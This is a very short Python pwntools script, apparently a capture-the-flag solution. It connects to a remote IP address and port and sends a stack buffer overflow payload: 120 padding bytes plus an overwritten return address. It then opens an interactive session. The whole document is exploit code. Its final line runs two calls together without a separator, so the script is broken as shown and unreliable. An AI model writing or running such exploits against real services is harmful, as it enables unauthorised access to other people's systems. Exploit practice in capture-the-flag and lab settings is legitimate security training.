#!/usr/bin/python3
# Author : trustie_rity

from pwn import *

p = remote("159.223.7.179",5001)
print(p.recv())
ret = p64(0x4011ab)
offset = 120
payload = b"\x90"*offset + ret

p.sendline(payload)p.interactive()
